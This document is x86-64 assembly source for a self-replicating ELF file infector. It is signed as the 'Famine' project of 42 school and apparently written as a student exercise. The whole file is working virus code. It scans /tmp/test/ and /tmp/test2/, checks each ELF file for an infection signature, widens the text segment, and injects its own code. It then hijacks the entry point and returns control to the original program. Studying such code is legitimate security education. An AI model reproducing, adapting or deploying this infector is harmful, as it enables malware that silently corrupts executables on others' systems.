				global			main
main:
sc:
				push			rbp
				mov				rbp,					rsp

				and				rsp,					0xfffffffffffffff0
				mov				rbx,					14 * 8 + 4 * 1024
				sub				rsp,					rbx

				push			rdi
				push			rsi
				push			rdx

				xor				rcx,					rcx
.loop:
				cmp				rcx,					rbx
				je				.end

				mov				byte[rsp+24+rcx],		0
				inc				rcx
				jmp				.loop
.end:
				lea				rdi,					[rel sc]
				add				rdi,					sc_end - sc
				and				rdi,					0xfffffffffffff000
				mov				rsi,					sc_data_end - sc_data
				add				rsi,					0x1000
				mov				rdx,					7
				mov				rax,					10
				syscall

				mov				qword[rel sc_glob],		rsp

				mov				qword[rsp+0x20],		sc_end - sc
				mov				qword[rsp+0x28],		sc_data_end - sc_data
				mov				rax,					qword[rsp+0x20]
				add				rax,					qword[rsp+0x28]
				mov				qword[rsp+0x30],		rax
				mov				rax,					qword[rel sc_real_entry]
				mov				qword[rsp+0xc70],		rax
				mov				rax,					qword[rel sc_child]
				mov				qword[rsp+0xc78],		rax
				mov				rax,					qword[rel sc_entry]
				mov				qword[rsp+0xc80],		rax

				lea				rdi,					[rel sc_dir_1]
				call			sc_proc_dir

				lea				rdi,					[rel sc_dir_2]
				call			sc_proc_dir

				mov				rax,					qword[rsp+0xc70]

				cmp				qword[rsp+0xc78],		0
				je				.parent
				
				lea				r8,						[rel sc]
				sub				r8,						qword[rsp+0xc80]
				add				rax,					r8
.parent:
				pop				rdx
				pop				rsi
				pop				rdi

				mov				rsp,					rbp
				pop				rbp
				jmp				rax
sc_proc_dir:
				push			rbp
				mov				rbp,					rsp

				and				rsp,					0xfffffffffffffff0
				sub				rsp,					8	; +8 dir_fd
				push			rdi							; +0 *dir

				mov				rsi,					0x10000
				mov				rax,					2
				syscall

				cmp				rax,					0
				jl				.end

				mov				qword[rsp+8],			rax
.loop:
				mov				rdi,					qword[rsp+8]
				mov				rsi,					qword[rel sc_glob]
				add				rsi,					0x860
				mov				rdx,					0x400
				mov				rax,					78
				syscall

				cmp				rax, 					0
				jle				.close_end

				mov				rdi,					rax
				mov				rsi,					qword[rsp]
				call			sc_proc_entries

				jmp				.loop
.close_end:
				mov				rdi,					qword[rsp+8]
				mov				rax,					3
				syscall
.end:
				mov				rsp,					rbp
				pop				rbp
				ret
sc_proc_entries:
				push			rbp
				mov				rbp,					rsp

				and				rsp,					0xfffffffffffffff0
				sub				rsp,					8		; +16 ent_ptr
				push			rdi								; +8 dir_ret
				push			rsi								; +0 root_path

				mov				rdx,					qword[rel sc_glob]
				add				rdx,					0x860
				mov				qword[rsp+16],			rdx
.loop:
				cmp				qword[rsp+8],			0	
				je				.end
				
				mov				rdi,					qword[rsp]
				mov				rsi,					qword[rsp+16]
				add				rsi,					18
				mov				rdx,					qword[rel sc_glob]
				add				rdx,					0x60
				call			sc_get_full_path

				mov				rdi,					qword[rel sc_glob]
				add				rdi,					0x60
				call			sc_map_file

				cmp				rax,					0
				jl				.inc

				mov				rbx,					qword[rel sc_glob]
				mov				rdx,					qword[rbx+0xc60]
				mov				qword[rbx+0x48],		rdx

				call			sc_test_elf_hdr
				cmp				rax,					0
				jl				.unmap
				call			sc_find_txt_seg
				cmp				rax,					0
				jl				.unmap
				call			sc_check_infection
				cmp				rax,					0
				jl				.unmap

				mov				rdx,					qword[rel sc_glob]
				mov				rax,					qword[rdx+0x50]	; txt
				mov				rbx,					qword[rdx+0x58] ; nxt

				mov				r8,						qword[rbx+0x8]
				mov				r9,						qword[rbx+0x10]
				mov				qword[rdx+0x38],		r8
				mov				qword[rdx+0x40],		r9
				mov				r8,						qword[rax+0x8]
				mov				r9,						qword[rax+0x10]
				add				r8,						qword[rax+0x20]
				add				r9,						qword[rax+0x28]
				sub				qword[rdx+0x38],		r8
				sub				qword[rdx+0x40],		r9

				call			sc_set_x_pad
				cmp				rax,					0
				jne				.unmap

				call			sc_update_mem

				mov				rdi,					qword[rel sc_glob]
				add				rdi,					0x60
				call			sc_write_mem
.unmap:
				mov				rsi,					qword[rel sc_glob]
				mov				rdi,					qword[rsi+0xc60]
				mov				rsi,					qword[rsi+0x18]
				mov				rax,					11
				syscall
.inc:
				mov				rdx,					qword[rsp+16]
				xor				rbx,					rbx
				mov				bx,						word[rdx+16]

				sub				qword[rsp+8],			rbx
				add				qword[rsp+16],			rbx
				jmp				.loop
.end:
				mov				rsp,					rbp
				pop				rbp
				ret
sc_update_mem:
				mov				rdi,					qword[rel sc_glob]
				mov				r8,						qword[rdi+0x50] ;hdrs.txt
				mov				r9,						qword[rdi+0x48]	;hdrs.elf

				mov				rdx,					qword[r8+0x10]
				add				rdx,					qword[r8+0x28]
				mov				qword[rel sc_entry],	rdx
				
				mov				rdx,					qword[r9+0x18]
				mov				qword[rel sc_real_entry], rdx

				mov				qword[rel sc_child],	1
				
				mov				rdx,					qword[rel sc_entry]
				mov				qword[r9+0x18],			rdx
			
				mov				rsi,					qword[rdi+0x30]
				add				qword[r8+0x20],			rsi
				add				qword[r8+0x28],			rsi
				
				ret
sc_set_x_pad:
				mov				rdi,					qword[rel sc_glob]
				mov				r8,						qword[rdi+0x48]		; *hdrs.elf
				mov				r9,						qword[rdi+0x50]		; *hdrs.txt
				mov				r10,					qword[r9+0x8]
				add				r10,					qword[r9+0x20]		; drs.txt->p_offset + hdrs.txt->p_filesz
				mov				rsi,					qword[rdi+0x30]

				mov				qword[rdi+0xc68],		0
				cmp				qword[rdi+0x38],		rsi
				jae				.success

				cmp				qword[rdi+0x40],		rsi
				jb				.error

				xor				rcx,					rcx
				mov				rdx,					qword[rdi+0xc60]
				add				rdx,					qword[r8+0x20]
.loop_1:
 				cmp				cx,						word[r8+0x38]
				je				.init_loop_2

				cmp				qword[rdx+0x8],			r10
				jb				.inc_1

				add				qword[rdx+0x8],			0x1000
.inc_1:
				inc				rcx
				add				rdx,					56
				jmp				.loop_1
.init_loop_2:
 				xor				rcx,					rcx
				mov				rdx,					qword[rdi+0xc60]
				add				rdx,					qword[r8+0x28]
.loop_2:
 				cmp				cx,						word[r8+0x3c]
				je				.set_pad

				cmp				qword[rdx+0x18],		r10
				jb				.inc_2
				
				add				qword[rdx+0x18],		0x1000
.inc_2:
  				inc				rcx
				add				rdx,					64
				jmp				.loop_2
.set_pad:
				add				qword[r8+0x28],			0x1000
 				mov				qword[rdi+0xc68],		1
.success:
 				xor				rax,					rax
				ret
.error:
 				mov				rax,					-1
				ret
sc_find_txt_seg:
				mov				rdi,					qword[rel sc_glob]
				mov				r8,						qword[rdi+0x48]; *hdrs.elf
				mov				qword[rdi+0x50],		0

				mov				rcx,					1
				mov				rsi,					qword[rdi+0xc60]
				add				rsi,					qword[r8+0x20]
.loop:
				cmp				qword[rdi+0x50],		0
				jne				.set_nxt

				cmp				rcx,					qword[r8+0x38]
				je				.error

				cmp				dword[rsi],				1
				jne				.inc

				mov				edx,					dword[rsi+0x4]
				and				edx,					0x1
				cmp				edx,					0
				je				.inc

				mov				qword[rdi+0x50],		rsi
.inc:
				inc				rcx
				add				rsi,					56
				jmp				.loop
.set_nxt:				
				mov				qword[rdi+0x58],		rsi
 				xor				rax,					rax
				ret
.error:
 				mov				rax,					-1
				ret
sc_check_infection:
				mov				r8,						qword[rel sc_glob]

				mov				rdi,					qword[r8+0xc60]
				mov				r9,						qword[r8+0x50]
				add				rdi,					qword[r9+0x8]
				add				rdi,					qword[r9+0x20]
				sub				rdi,					50
				lea				rsi,					[rel sc_sign]
				mov				rdx,					49
				call			sc_str_n_cmp

				cmp				rax,					0
				je				.error
.end:
				xor				rax,					rax
				ret
.error:
 				mov				rax,					-1
				ret
sc_test_elf_hdr:
				mov				r8,						qword[rel sc_glob]
				mov				r9,						qword[r8+0x48]; *hdrs.elf

				mov				rdi,					r9
				lea				rsi,					[rel sc_ident]
				mov				rdx,					5
				call			sc_str_n_cmp

				cmp				rax,					0
				jne				.error

				cmp				word[r9+0x12],			62
				jne				.error

				cmp				word[r9+0x3e],			0
				je				.error

				cmp				word[r9+0x3e],			0xffff
				je				.error

				cmp				word[r9+0x10],			2
				je				.success

				cmp				word[r9+0x10],			3
				jne				.error
.success:
 				xor				rax,					rax
				ret
.error:
 				mov				rax,					-1
				ret
sc_write_mem:
				push			rbp
				mov				rbp,					rsp

				and				rsp,					0xfffffffffffffff0
				sub				rsp,					72	;	+0x0	dst
															;	+0x8	code_offset
															;	+0x10	sz.mem
															;	+0x18	sz.load
															;	+0x20	sz.f_pad
															;	+0x28	*hdrs.txt
															;	+0x30	*mem
															;	+0x38	x_pad
															;	+0x40	sz.mem - (code_offset + sz.f_pad)
				mov				r8,						qword[rel sc_glob]
				mov				r9,						qword[r8+0x18]
				mov				qword[rsp+0x10],		r9
				mov				r9,						qword[r8+0x30]
				mov				qword[rsp+0x18],		r9
				mov				r9,						qword[r8+0x38]
				mov				qword[rsp+0x20],		r9
				mov				r9,						qword[r8+0x50]
				mov				qword[rsp+0x28],		r9
				mov				r9,						qword[r8+0xc60]
				mov				qword[rsp+0x30],		r9
				mov				r9,						qword[r8+0xc68]
				mov				qword[rsp+0x38],		r9

				mov				rax,					2
				mov				rsi,					1
				syscall

				cmp				rax,					0
				jl				.end

				mov				qword[rsp],				rax

				mov				r9,						qword[rsp+0x28]; *hdrs.txt
				mov				rdx,					qword[r9+0x8]
				add				rdx,					qword[r9+0x20]
				sub				rdx,					qword[rsp+0x18]
				mov				qword[rsp+0x8],			rdx

				mov				rdi,					qword[rsp]
				mov				rsi,					qword[rsp+0x30]

				mov				rax,					1
				syscall

				cmp				rax,					qword[rsp+0x8]
				jne				.close

				mov				rdi,					qword[rsp]
				lea				rsi,					[rel sc]
				mov				rdx,					qword[rsp+0x18]
				mov				rax, 					1
				syscall
			
				cmp				rax,					qword[rsp+0x18]
				jne				.close

				mov				rdi,					qword[rsp]
				mov				rax,					qword[rsp+0x38]
				mov				rbx,					0x1000
				mul				rbx
				mov				rsi,					rax
				add				rsi,					qword[rsp+0x20]
				sub				rsi,					qword[rsp+0x18]
				call			sc_write_pad

				cmp				rax,					0
				jne				.close

				mov				rdi,					qword[rsp]
				mov				rsi,					qword[rsp+0x30]
				add				rsi,					qword[rsp+0x8]
				add				rsi,					qword[rsp+0x20]
				mov				rdx,					qword[rsp+0x10]
				sub				rdx,					qword[rsp+0x8]
				sub				rdx,					qword[rsp+0x20]

				mov				qword[rsp+0x40],		rdx
				mov				rax,					1
				syscall
 .close:
 				mov				rdi,					qword[rsp]
				mov				rax,					3
				syscall
 .end:
 				mov				rsp,					rbp	
				pop				rbp
				ret
sc_map_file:
				push			rbp
				mov				rbp,					rsp
				and				rsp,					0xfffffffffffffff0
				sub				rsp,					8			; src

				mov				rsi,					2
				mov				rax,					2
				syscall

				cmp				rax,					0
				jl				.error

				mov				qword[rsp],				rax
				mov				rdi,					rax
				call			sc_get_fd_size

				cmp				rax,					0
				jl				.err_close

				mov				r8,						qword[rel sc_glob]
				mov				qword[r8+0x18],			rax
				cmp				qword[r8+0x18],			64
				jb				.err_close

				mov				rdi,					0
				mov				rsi,					rax
				mov				rdx,					3
				mov				r10,					0x22
				mov				r8,						-1
				mov				r9,						0
				mov				rax,					9
				syscall

				cmp				rax,					-1
				je				.err_close

				mov				r8,						qword[rel sc_glob]
				mov				qword[r8+0xc60],		rax

				mov				rdi,					qword[r8+0xc60]
				mov				rsi,					qword[rsp]
				call			sc_file_cpy

				cmp				rax,					0
				jl				.munmap

				mov				rdi,					qword[rsp]
				mov				rax,					3
				syscall

				xor				rax,					rax
				jmp				.end
.munmap:
				mov				r8,						qword[rel sc_glob]
				mov				rdi,					qword[r8+0xc60]
				mov				rsi,					qword[r8+0x18]
				mov				rax,					11
				syscall
.err_close:
				mov				rdi,					qword[rsp]
				mov				rax,					3
				syscall
.error:
 				mov				rax,					-1
.end:
				mov				rsp,					rbp
				pop				rbp
				ret
sc_file_cpy:
				push			rbp
				mov				rbp,					rsp

				sub				rsp,					8	; i		0x10
				push			rdi							; mem	0x8
				push			rsi							; src	
.loop_1:
				mov				r8,						qword[rel sc_glob]

				mov				rdi,					qword[rsp]
				lea				rsi,					[r8+0xc88]
				mov				rdx,					0x400
				mov				rax,					0
				syscall

				cmp				rax,					0
				jle				.end
				
				mov				qword[rsp+0x10],		0
.loop_2:
				cmp				qword[rsp+0x10],		rax
				je				.loop_1

				mov				r8,						qword[rel sc_glob]
				lea				r8,						[r8+0xc88]
				mov				r10,					qword[rsp+0x10]
				mov				r9b,					byte[r8+r10]
				mov				r10,					qword[rsp+0x8]
				mov				byte[r10],				r9b

				inc				qword[rsp+0x10]
				inc				qword[rsp+0x8]
				jmp				.loop_2
.end:
				pop				rsi
				pop				rdi

				mov				rsp,					rbp
				pop				rbp
				ret
sc_write_pad:
				push			rbp
				mov				rbp,					rsp

				and				rsp,					0xfffffffffffffff0
				push			rdi							;	+0x10	fd
				push			rsi							;	+0x8	size
				sub				rsp,					8	;	+0x0	write_sz

				mov				qword[rsp],				0
.loop:
 				cmp				qword[rsp+0x8],			0
				je				.success

				mov				qword[rsp],				0x400
				cmp				qword[rsp+0x8],			0x400
				jae				.write

				mov				rdx,					qword[rsp+0x8]
				mov				qword[rsp],				rdx
.write:
				mov				rdi,					qword[rsp+0x10]
 				mov				r8,						qword[rel sc_glob]
 				lea				rsi,					[r8+0x460]
				mov				rdx,					qword[rsp]
				mov				rax,					1
				syscall

				cmp				rax,					qword[rsp]
				jne				.error

 				mov				r8,						qword[rsp]
 				sub				qword[rsp+0x8],			r8
				jmp				.loop
.error:
 				mov				rax,					-1
				jmp				.end
.success:
 				xor				rax,					rax
.end:
				mov				rsp,					rbp
				pop				rbp
				ret
sc_get_fd_size:
				push			rbp
				mov				rbp,					rsp

				and				rsp,					0xfffffffffffffff0
				push			rdi									; fd +8
				sub				rsp,					8			; size +0

				mov				rsi,					0
				mov				rdx,					2
				mov				rax,					8
				syscall
				
				cmp				rax,					0
				jl				.error

				mov				qword[rsp],				rax

				mov				rdi,					qword[rsp+0x8]
				mov				rsi,					0
				mov				rdx,					0
				mov				rax,					8
				syscall

				cmp				rax,					0
				jne				.error
				
				mov				rax,					qword[rsp]
				jmp				.end
.error:
 				mov				rax,					-1	
.end:
				mov				rsp,					rbp
				pop				rbp
				ret
sc_str_n_cmp:
				xor				rax,					rax
.loop:
				cmp				byte[rdi],				0
				je				.end

				mov				al,						byte[rdi]
				cmp				al,						byte[rsi]
				jne				.end

				dec				rdx
				cmp				rdx,					0
				je				.end
.inc:
				inc				rdi
				inc				rsi
				jmp				.loop
.end:
				sub				al,						byte[rsi]
				ret
sc_get_full_path:
.loop_1:
 				cmp				byte[rdi],				0
				je				.loop_2

				mov				al,						byte[rdi]
				mov				byte[rdx],				al
				inc				rdi
				inc				rdx
				jmp				.loop_1
.loop_2:
 				cmp				byte[rsi],				0
				je				.end

				mov				al,						byte[rsi]
				mov				byte[rdx],				al
				inc				rsi
				inc				rdx
				jmp				.loop_2
.end:
 				mov				byte[rdx],				0
				ret
sc_end:

sc_data:
sc_dir_1:
				db				"/tmp/test/", 0
sc_dir_2:
				db				"/tmp/test2/", 0
sc_entry:
				dq				sc
sc_real_entry:
				dq				sc_first_real_entry
sc_ident:
				db				0x7f, "ELF", 0x2
sc_child:
				dq				0
sc_glob:
				dq				0	; +0x18 -> sz.mem
									; +0x20 -> sz.code
									; +0x28 -> sz.data
									; +0x30 -> sz.load
									; +0x38 -> sz.f_pad
									; +0x40 -> sz.m_pad

									; +0x48 -> *hdrs.elf
									; +0x50 -> *hdrs.txt
									; +0x58 -> *hdrs.nxt
									
									; +0x60 -> buffs.path
									; +0x460 -> buffs.zeros
									; +0x860 -> buffs.entry

									; +0xc60 -> *mem
									; +0xc68 -> x_pad
									; +0xc70 -> real_entry
									; +0xc78 -> child
									; +0xc80 -> entry

									; +0xc88 -> buffs.copy
sc_sign:
				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
sc_data_end:

sc_first_real_entry:
				xor				rdi,				rdi
				mov				rax,				60
				syscall
